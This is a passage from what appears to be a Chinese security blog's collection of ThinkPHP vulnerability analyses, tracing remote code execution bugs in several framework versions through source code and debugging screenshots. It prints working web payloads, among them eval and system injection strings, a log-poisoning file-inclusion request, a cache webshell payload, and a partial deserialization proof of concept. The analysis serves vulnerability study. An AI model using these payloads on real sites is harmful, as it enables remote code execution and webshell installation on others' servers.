class=\"line\">&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;xxx&#x2F;$&#123;system(whoami)&#125;</span><br><span class=\"line\">&#x2F;index.php?s&#x3D;a&#x2F;b&#x2F;c&#x2F;$&#123;@print(eval($_POST[1]))&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b26ee9e623cf4a4886a6b55336b65043.png\"></p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><h2 id=\"文件位置\"><a href=\"#文件位置\" class=\"headerlink\" title=\"文件位置\"></a>文件位置</h2><blockquote>\n<p>./ThinkPHP/Lib/Think/Util/Dispatcher.class.php</p>\n</blockquote>\n<p>这个是thinkphp <code>内置的Dispacher类</code>，用来完成 <code>URL解析、路由和调度</code></p>\n<p>thinkphp MVC框架请求都是根据路由来决定的。而Dispatcher.class.php就是规定如何来解析路由的这样一个类</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">类名为&#96;Dispatcher&#96;，class Dispatcher extends Think</span><br><span class=\"line\">里面的方法有:</span><br><span class=\"line\"></span><br><span class=\"line\">static public function dispatch() URL映射到控制器</span><br><span class=\"line\">public static function getPathInfo()  获得服务器的PATH_INFO信息</span><br><span class=\"line\">static public function routerCheck() 路由检测</span><br><span class=\"line\">static private function parseUrl($route)</span><br><span class=\"line\">static private function getModule($var) 获得实际的模块名称</span><br><span class=\"line\">static private function getGroup($var) 获得实际的分组名称</span><br></pre></td></tr></table></figure>\n\n<p>有漏洞的代码位置在static public function dispatch()，URL映射控制器，也就是URL访问的路径是映射到哪个控制器下。</p>\n<p>就是说url控制器会<strong>以数组形式获取url中输入的变量</strong></p>\n<h2 id=\"代码块\"><a href=\"#代码块\" class=\"headerlink\" title=\"代码块\"></a>代码块</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 分析PATHINFO信息</span></span><br><span class=\"line\"><span class=\"built_in\">self</span>::getPathInfo();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"built_in\">self</span>::routerCheck())&#123;   <span class=\"comment\">// 检测路由规则 如果没有则按默认规则调度URL</span></span><br><span class=\"line\">    <span class=\"variable\">$paths</span> = explode(<span class=\"variable\">$depr</span>,trim(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PATH_INFO&#x27;</span>],<span class=\"string\">&#x27;/&#x27;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$var</span>  =  <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (C(<span class=\"string\">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[C(<span class=\"string\">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$var</span>[C(<span class=\"string\">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class=\"variable\">$paths</span>[<span class=\"number\">0</span>]),explode(<span class=\"string\">&#x27;,&#x27;</span>,strtolower(C(<span class=\"string\">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class=\"variable\">$paths</span>) : <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(C(<span class=\"string\">&#x27;APP_GROUP_DENY&#x27;</span>) &amp;&amp; in_array(strtolower(<span class=\"variable\">$var</span>[C(<span class=\"string\">&#x27;VAR_GROUP&#x27;</span>)]),explode(<span class=\"string\">&#x27;,&#x27;</span>,strtolower(C(<span class=\"string\">&#x27;APP_GROUP_DENY&#x27;</span>))))) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 禁止直接访问分组</span></span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[C(<span class=\"string\">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class=\"comment\">// 还没有定义模块名称</span></span><br><span class=\"line\">        <span class=\"variable\">$var</span>[C(<span class=\"string\">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class=\"variable\">$paths</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$var</span>[C(<span class=\"string\">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class=\"variable\">$paths</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 解析剩余的URL参数</span></span><br><span class=\"line\">    <span class=\"variable\">$res</span> = preg_replace(<span class=\"string\">&#x27;@(\\w+)&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;([^&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;\\/]+)@e&#x27;</span>, <span class=\"string\">&#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;</span>, implode(<span class=\"variable\">$depr</span>,<span class=\"variable\">$paths</span>));</span><br><span class=\"line\">    <span class=\"variable\">$_GET</span>   =  array_merge(<span class=\"variable\">$var</span>,<span class=\"variable\">$_GET</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p><strong>Preg_replace</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">preg_replace(&#39;正则规则&#39;,&#39;替换字符&#39;,&#39;目标字符&#39;)</span><br></pre></td></tr></table></figure>\n<p>/e 配合函数preg_replace()使用, 可以把匹配来的第二个参数字符串当作正则表达式执行;  </p>\n<p>这个函数5.2~5.6都还是可以执行的，但是到了php 版本7 以上，就已经都不支持/e修饰符了。</p>\n<p><strong>(\\w+)/([^/]+)</strong></p>\n<p>正则的意思是取每2个参数</p>\n<p><strong>$var[‘\\1’]=”\\2”;</strong></p>\n<p>是对数组的操作，<strong>将之前第一个值作为新数组的键，将第二个值作为新数组的值</strong></p>\n<p>这里也是关键第二个参数是用双引号进行包裹的而双引号中的php变量语法又是能够被解析执行的</p>\n<p><strong>array_shift()</strong> </p>\n<p>删除数组中的第一个元素（red），并返回被删除元素的值</p>\n<h2 id=\"分析语句：\"><a href=\"#分析语句：\" class=\"headerlink\" title=\"分析语句：\"></a>分析语句：</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[C(<span class=\"string\">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class=\"comment\">// 还没有定义模块名称</span></span><br><span class=\"line\">    <span class=\"variable\">$var</span>[C(<span class=\"string\">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class=\"variable\">$paths</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$var</span>[C(<span class=\"string\">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class=\"variable\">$paths</span>);</span><br><span class=\"line\"><span class=\"comment\">// 解析剩余的URL参数</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$res</span> =</span><br><span class=\"line\">preg_replace(<span class=\"string\">&#x27;@(\\w+)&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;([^&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;\\/]+)@e&#x27;</span>,<span class=\"string\">&#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;</span>, implode(<span class=\"variable\">$depr</span>,<span class=\"variable\">$paths</span>));</span><br><span class=\"line\"><span class=\"variable\">$_GET</span>   =  array_merge(<span class=\"variable\">$var</span>,<span class=\"variable\">$_GET</span>);</span><br></pre></td></tr></table></figure>\n\n<p>拿一个payload进行说明：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;index.php?s&#x3D;a&#x2F;b&#x2F;c&#x2F;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>\n<p>首先删除数组中的前两个值，payload变为：<code>c/$&#123;phpinfo()&#125;</code></p>\n<p>经过implode变为字符串再经过\\w+，存入到var的键和值中，由于/e模式，<code>执行了值中的$&#123;phpinfo()&#125;</code>实行了命令执行</p>\n<p>var来自于paths：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$paths &#x3D; explode($depr,trim($_SERVER[&#39;PATH_INFO&#39;],&#39;&#x2F;&#39;));</span><br><span class=\"line\">即来自url中</span><br></pre></td></tr></table></figure>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP 3.2.x RCE","url":"/2023/12/25/ThinkPHP%203.2.x%20RCE/","content":"<h1 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h1><p>该漏洞是在受影响的版本中，业务代码中如果 <code>模板赋值方法assign的第一个参数可控</code>，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。</p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><blockquote>\n<p>\\Application\\Home\\Controller\\IndexController.class.php</p>\n</blockquote>\n<p>写入demo代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Home</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Think</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"><span class=\"variable\">$value</span>=<span class=\"string\">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;assign(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;display();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n\n<blockquote>\n<p>\\Application\\Home\\View\\Index\\index.html</p>\n</blockquote>\n<p>自己创建Index目录和index.html文件，index.html的内容任意</p>\n<h1 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h1><p>分为debug模式开启与关闭两种方式，差别不大</p>\n<p>若开启debug模式日志会到：</p>\n<blockquote>\n<p>\\Application\\Runtime\\Logs\\Home\\下</p>\n</blockquote>\n<p>若未开启debug模式日志会到：</p>\n<blockquote>\n<p>\\Application\\Runtime\\Logs\\Common\\下</p>\n</blockquote>\n<p>Debug关闭：</p>\n<p>bp抓包修改：</p>\n<blockquote>\n<p>/index.php?m=–&gt;<?=phpinfo();?></p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/007cc087595d4d138605361b81023e7a.png\"><br>会将错误记录到日志中</p>\n<blockquote>\n<p>\\Application\\Runtime\\Logs\\Common\\21_08_29.log</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2d206d364a1c42bca28d35fddfe5ceaa.png\"><br>构造攻击请求：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;.&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;21_08_29.log</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/13c638770e9a4836a02b2234430ad929.png\"></p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6bc534cf440b424f84cd463769a953da.png\"></p>\n<p>当构造包含请求，跟进</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/9cd341c47fce42a09abde6f374435be3.png\"></p>\n<p>ThinkPHP/Library/Think/Controller.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/635027d41fdd4e98b96cd76ca03a6bf3.png\"></p>\n<p>ThinkPHP/Library/Think/View.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b38b3635d0fb4388a6f0b21697a882d3.png\"></p>\n<p>进入assign方法，由于传入的$name是数组，所以进入if，赋值给数组tVar</p>\n<p>然后进入display方法开始解析并获取模板文件内容</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/c3feaa44354b43339d6923adbabdee49.png\"></p>\n<p>ThinkPHP/Library/Think/Controller.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/096b8dca50b8460aa56a6a93f983eccd.png\"></p>\n<p>ThinkPHP/Library/Think/View.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/edaf40928b3d498a93f09544a711fc17.png\"></p>\n<p>这时传入的参数全是空</p>\n<p>接着进入fetch方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/09244c4475f741188e6ad1468cc795d9.png\"></p>\n<p>ThinkPHP/Library/Think/View.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a7579343a44e4cf7bff0499975a940bb.png\"></p>\n<p>如果内容为空，程序会去根据配置获取默认的模板文件位置(./Application/Home/View/Index/index.html)，所以我们这里要去新建这个目录和文件</p>\n<p>接着进行判断模板引擎是什么</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/4709eebdc41b4cc5afa19c072925fd1f.png\"></p>\n<p>因为默认配置是think，所以进入else分支，将tVar赋给了<code>$params[&#39;var&#39;]</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/73324f3d4b5a492dadb16f3278137d65.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/5ebc9a7903c14d47bbc861487bb26f34.png\"></p>\n<p>进入Hook::listen</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2acce5e0677d46978e64dfe686b3aa96.png\"></p>\n<p>ThinkPHP/Library/Think/Hook.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/8590777bd1c44742a6cde0e8b6169df3.png\"></p>\n<p>进入exec方法中，处理后调用Behavior\\ParseTemplateBehavior类中的<code>run方法</code>处理$params这个带有日志文件路径的值。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/625b741cc3f8487b8ab5ec841af387f3.png\" alt=\"在这里插入图片描述\"></p>\n<p>随后进入run方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6c744fee31ce4b399d9053fbdacf2c52.png\"></p>\n<p>前面进行判断，重点看这个fetch方法，因为我们的payload在<code>[&#39;var&#39;]</code>下，所以看这里</p>\n<p>调用ThinkPHP/Library/Think/Template.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/4289cc72f74142d491ea517ead3c8a37.png\"></p>\n<p>将payload赋给tVar,进入到Storage::load</p>\n<p>ThinkPHP/Library/Think/Storage/Driver/File.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e71e14d705bf404a9fb93d16d49e2f80.png\"></p>\n<p>extract, EXTR_OVERWRITE - 默认。如果有冲突，覆盖已有的变量，然后进行include</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/eec5d7074c4648109f3e7a007d369004.png\"></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP v5 缓存Getshell 分析","url":"/2023/12/25/ThinkPHP%205%20%E7%BC%93%E5%AD%98Getshell%20%E5%88%86%E6%9E%90/","content":"<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><p>网站为了提高访问效率往往会将用户访问过的页面存入缓存来减少开销。而Thinkphp 在使用缓存的时候是将数据序列化，然后存进一个 php 文件中，这使得命令执行等行为成为可能。</p>\n<p>利用版本 <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p>\n<h1 id=\"漏洞利用前提\"><a href=\"#漏洞利用前提\" class=\"headerlink\" title=\"漏洞利用前提\"></a>漏洞利用前提</h1><p>站点能够将缓存文件列出，并且用户可以得到路径</p>\n<p>1、缓存使用文件方式并且缓存目录暴露在web目录下面<br>2、攻击者要能猜到开发者使用的缓存key</p>\n<p>知道缓存类所设置的键名，这样才能找到 webshell 路径；其次如果按照官方说明开发程序， webshell 最终会被写到 runtime 目录下，而官方推荐 public 作为 web 根目录，所以即便我们写入了 shell ，也无法直接访问到；最后如果程序有设置 $this-&gt;options[‘prefix’] 的话，在没有源码的情况下，我们还是无法获得 webshell 的准确路径。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"复现环境\"><a href=\"#复现环境\" class=\"headerlink\" title=\"复现环境\"></a>复现环境</h1><p>Thinkphp 5.0.5 phpstudy</p>\n<p>控制器写入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use think\\Cache;</span><br><span class=\"line\"></span><br><span class=\"line\">public function rce()&#123;</span><br><span class=\"line\">    Cache::set(&quot;cache&quot;,input(&#39;get.cache&#39;));</span><br><span class=\"line\">    return &#39;done&#39;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h1><p>Payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?cache&#x3D;test%0d%0a@eval($_GET[shell]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p>shell文件路径跟 <code>Cache::set(&quot;cache&quot;,input(&#39;get.cache&#39;));</code>  有关，后续分析</p>\n<p>访问 \\runtime\\cache.……</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/832cafbb4e694986908515e5c98af9ef.png\"></p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>首先进入控制器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2489b3c169c74231b00cc93192ca73f4.png\"></p>\n<p>autoload自动实例化</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2d6c7efac01d40c8a79a3984a49340e4.png\"><br>接着进入<code>input方法</code> 判断请求的方法和请求的参数，此处为 <code>get.cache</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/d7d9a98df9154bd4b4f980ea88907361.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1bf109b5b00a4c54b6c2a3b4ab4e921b.png\"><br>过滤</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ef46927e853c45649155b3af83f5dfb3.png\"><br>然后进入cache类的set方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/8f90daf80f354e078e1301e54733b684.png\"><br>跟进<code>init()</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/fe5df6f6c06b48c2a866016e3c3205e8.png\"><br>先进入get()方法 返回了默认参数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e2b063bc686b4912a4e54eb2237317d0.png\"><br>接着继续进入connect方法中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/c1e06ff9b11a48e19194e25fcd809695.png\"><br>最后返回的 <code>self::$handler</code> 是 <code>think\\cache\\driver\\File类的对象</code></p>\n<p>返回到 <code>Cache::set</code> 经过init中的connect 所以 <code>调用了File类的set方法</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1657dd73824b47de842fd7c7a8fbf3ca.png\"><br>跟进File类的set方法，利用换行写入shell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6329ff45728a4d92aa2765ebc37ca15e.png\"><br>$filename是通过 <code>getCacheKey()</code>得到</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b3f545cabd6747038a95f259c7842fe2.png\"><br>生成文件逻辑就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cache::set(&quot;cache&quot;,input(&#39;get.cache&#39;));</span><br></pre></td></tr></table></figure>\n<p><code>Cache::set第一个参数作为cache的key 将其md5，然后默认当cache_subdir = true时截取前两位作为子目录，剩下的30位为文件名 false时直接在cache目录下生成文件</code></p>\n<p>当为false时</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a5d4d9c03c2645e79d367cbb079547d7.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/90b9357c2eed43339ce4f21444ef6ff2.png\"></p>\n<h1 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e82034e5d5e2491d92a27bbd321a7296.png\"></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP v6.0.x 反序列化漏洞 分析","url":"/2023/12/25/ThinkPHP%206.0.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>可能下的环境有问题，不多说了</p>\n<p>参考：</p>\n<p><a href=\"https://xz.aliyun.com/t/9405\">ThinkPHP 6 反序列化漏洞</a></p>\n<p><a href=\"https://whoamianony.top/2020/12/31/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/thinkphp/ThinkPHP%20V6.0.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\">ThinkPHP V6.0.x 反序列化漏洞</a></p>\n<p>前面的方法跟6.0.9那里一样 不管是通过updateData()还是通过insertData() 最后都是走到 <code>$this-&gt;db() 来触发__toString</code></p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>这里直接省略前面 跟进<code>updateData()</code></p>\n<p>所以多出的条件是 <code>$this-&gt;exists = true</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/bf0f101393d8419688291eba0f1852f9.png\"></p>\n<a id=\"more\"></a>\n\n<p>这里的 <code>__toString</code> 是在 <code>Conversion</code> 进行触发的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/040d482e1f0b459ca3032f52ef4ad9a1.png\"></p>\n<p>跟进 <code>toArray()</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7e08422a5de54a0097322802f333f448.png\"></p>\n<p>这里</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$data</span> = array_merge(<span class=\"keyword\">$this</span>-&gt;data, <span class=\"keyword\">$this</span>-&gt;relation);</span><br></pre></td></tr></table></figure>\n\n<p><code>$data</code> 合并了 <code>$this-&gt;data, $this-&gt;relation</code></p>\n<p>然后进行<br><code>foreach ($data as $key =&gt; $val)</code></p>\n<p>那么这里的 <code>$key</code> 包含了 <code>$this-&gt;data, $this-&gt;relation</code> 的key  我称它为<code>大key</code>吧</p>\n<p>跟进 <code>getAttr()</code> 这里传入的参数<code>$name是大key</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f257197d3009454392bae6f22f52df72.png\"></p>\n<p>跟进 <code>getData()</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/990c1d1e57ef4d53bd160f33665f1a36.png\"></p>\n<p>再跟进 <code>getRealFieldName()</code> 传入的参数依然是 <code>大key</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/40d7c6e763c04760b6ad716ba688c0aa.png\"></p>\n<p>还是返回 <code>$name</code> 这里返回到 <code>getData()</code>中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/d85224c5ae8748a4a80e784f6f2aa9c3.png\"></p>\n<p>接着进入 <code>if</code> 就是看这个<code>大key不论是$this-&gt;data, $this-&gt;relation 中的哪一个</code> ，然后返回到 <code>getAttr()</code> 作为变量 <code>$value</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/bdaab3c60002494489276a832e585127.png\"></p>\n<p>跟进 <code>getValue()</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/10b6084728cb41e9b4bfdd21b3064b9a.png\"></p>\n<p>最后实例化抽象类Model还是用 <code>Pivot类</code></p>\n<p>但是可能我tp版本太高了存在这一句</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$closure</span> <span class=\"keyword\">instanceof</span> \\<span class=\"built_in\">Closure</span>)</span><br></pre></td></tr></table></figure>\n<p>可以看一下不一样的地方</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ec4f12bb2a634dcaa0db81576d41ba25.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e8c5c8cede1843328cc63c848e5f4e4f.png\"></p>\n<p>导致exp无法利用</p>\n<p>具体解释：</p>\n<blockquote>\n<p>这里不再直接使用$closure来处理，而是先判断是否继承闭包，因为反序列化闭包的存在，我认为还是可以上面的链子的，但是topthink/framework 在v6.0.3 版本后不再使用opis/closure 依赖，导致没办法利用。</p>\n</blockquote>\n<p>所以上面的利用链只能在 <code>tp6.0.3及以前的版本使用</code>。</p>\n<h1 id=\"v6-0-3之前\"><a href=\"#v6-0-3之前\" class=\"headerlink\" title=\"v6.0.3之前\"></a>v6.0.3之前</h1><p>poc 6.0.3之前：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">concern</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">trait</span> Attribute&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span>=[<span class=\"string\">&#x27;jiang&#x27;</span>=&gt;<span class=\"string\">&#x27;whoami&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$withAttr</span>=[<span class=\"string\">&#x27;jiang&#x27;</span>=&gt;<span class=\"string\">&#x27;system&#x27;</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">trait</span> ModelEvent&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$withEvent</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">Attribute</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">ModelEvent</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$exists</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$force</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span 